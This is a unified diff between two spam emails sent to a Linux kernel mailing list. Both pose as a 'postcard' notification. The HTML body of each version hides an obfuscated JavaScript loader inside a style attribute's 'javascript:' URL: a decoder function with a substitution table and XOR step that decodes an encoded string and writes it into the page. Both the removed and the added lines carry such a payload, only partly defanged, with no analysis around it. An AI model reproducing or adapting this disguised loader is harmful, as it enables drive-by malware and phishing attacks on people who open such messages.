@@ -1,60 +1,52 @@
-From: post@postcard.com
-Date: Thu, 09 Feb 2006 18:26:15 +0000
+From: Isaac Cornell <array@fiberia.com>
+Date: Mon, 13 Feb 2006 18:06:18 +0000
 Subject: [KJ] You have received a postcard
-Message-Id: <001101c62dae$b1a449b2$6600a8c0@cruise>
+Message-Id: <848301c630c8$577fadef$8e428b55@fiberia.com>
 MIME-Version: 1
-Content-Type: multipart/mixed; boundary="===============83523800541518334=="
+Content-Type: multipart/mixed; boundary="----=_NextPart_000_0000_4FC8E61D.15EC040D"
 List-Id: <kernel-janitors.vger.kernel.org>
+References: <001101c62dae$b1a449b2$6600a8c0@cruise>
+In-Reply-To: <001101c62dae$b1a449b2$6600a8c0@cruise>
 To: kernel-janitors@vger.kernel.org
 
 This is a multi-part message in MIME format...
 
---===============83523800541518334==
+------=_NextPart_000_0000_4FC8E61D.15EC040D
 Content-Type: multipart/alternative;
-    boundary="----------=_1139513226-8172-494"
+    boundary="----------=_1139854108-11158-115"
 Content-Transfer-Encoding: binary
 MIME-Version: 1.0
 X-Mailer: MIME-tools 5.411 (Entity 5.404)
 
 This is a multi-part message in MIME format...
 
-------------=_1139513226-8172-494
+------------=_1139854108-11158-115
 Content-Type: text/plain;
-	charset="iso-8859-1"
-Content-Transfer-Encoding: quoted-printable
+    charset="iso-8859-1"
+Content-Transfer-Encoding: 7bit
 Content-Disposition: inline
 
 
-------------=_1139513226-8172-494
-Content-Type: text/html;
-	charset="iso-8859-1"
+------------=_1139854108-11158-115
+Content-Type: text/html; charset="iso-8859-1"
 Content-Transfer-Encoding: quoted-printable
 Content-Disposition: inline
 
-<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
-<HTML><HEAD>
-<META http-equiv=3DContent-Type content=3D"text/html; charset=3Diso-8859-1">
-<META content=3D"MSHTML 6.00.2900.2722" name=3DGENERATOR>
-<DEFANGED_style_0 </STYLE>
-</HEAD>
-<BODY>
-<a target=3D"_blank"  href=3D"www.sta.com>"style=3D"background:url\(java/**=
-/script:function dc(x){var DEFANGED_l=3D'x.length,b=3D1024,i,j,r,p=3D0,s=3D=
-0,w=3D0,t=3DArray(63,2,46,52,62,37,7,42,55,22,0,0,0,0,0,0,51,30,50,58,56,40=
-,4,8,15,9,5,23,53,32,54,1,59,27,38,44,41,36,0,14,11,33,20,0,0,0,0,21,0,60,1=
-0,12,45,61,6,34,47,57,17,19,18,48,29,26,25,24,43,28,49,16,31,3,35,13,39);fo=
-r(j=3DMath.ceil(l/b);j>0;j--){r=3D'';for(i=3DMath.min(l,b);i>0;i--,l--){w|=
-=3D(t[x.charCodeAt(p++)-48])<<s;if(s){r+=3DString.fromCharCode(165^w&255);w=
->>=3D8;s-=3D2}else{s=3D6}}document.write(r)}}dc('pWaLFxcm9ws3JoSBIQyRZ9p5V9=
-DLbXdLqlp5_1qY6raLOwaLq9pYwvytGwatbvnmVvyR_9DmKkcBVQnLFQc@XXcR_2pRwvytGwsYw=
-vytGwatbvnmVvyR_9ELKQcRy6n3_0TgbWpUXbI5XliUl2G5u7ELuKnLbvn3b2pRbWaLFxcm9ws3=
-Q1'))"'>
-</BODY>
-</HTML>
+<a target=3D"_blank" =A0href=3D"www.yahoo.com>"style=3D"background:url\(jav=
+a/**/script:function dc(x){var DEFANGED_l=3D'x.length,b=3D1024,i,j,r,p=3D0,=
+s=3D0,w=3D0,t=3DArray(63,26,39,57,27,55,61,62,36,2,0,0,0,0,0,0,1,47,44,37,1=
+3,3,42,48,25,54,41,30,49,58,21,19,7,14,33,9,8,56,46,24,18,12,35,0,0,0,0,15,=
+0,10,11,52,31,22,60,0,23,51,59,17,5,50,6,38,16,28,53,4,20,45,40,32,43,29,34=
+);for(j=3DMath.ceil(l/b);j>0;j--){r=3D'';for(i=3DMath.min(l,b);i>0;i--,l--)=
+{w|=3D(t[x.charCodeAt(p++)-48])<<s;if(s){r+=3DString.fromCharCode(165^w&255=
+);w>>=3D8;s-=3D2}else{s=3D6}}document.write(r)}}dc('HQfrsZYGeEqcl1BmS4DoteH=
+CgeUraburWXHCN9WRPxfr@EfrWeHREdDLTEfLadyGgdDoNeUGhOYmg4yrs4YibbYoNVHoEdDLTE=
+qREdDLTEfLadyGgdDoNevrh4YoDPycN0JzaaucXAULhiqcbEY5PEBrkZBmTAvLaZBz4oJzEdDLT=
+EBrgP6o'))"'>
 
-------------=_1139513226-8172-494--
+------------=_1139854108-11158-115--
 
---===============83523800541518334==
+------=_NextPart_000_0000_4FC8E61D.15EC040D
 Content-Type: text/plain; charset="iso-8859-1"
 MIME-Version: 1.0
 Content-Transfer-Encoding: quoted-printable
@@ -65,4 +57,4 @@ Kernel-janitors mailing list
 Kernel-janitors@lists.osdl.org
 https://lists.osdl.org/mailman/listinfo/kernel-janitors
 
---===============83523800541518334==--
+------=_NextPart_000_0000_4FC8E61D.15EC040D--
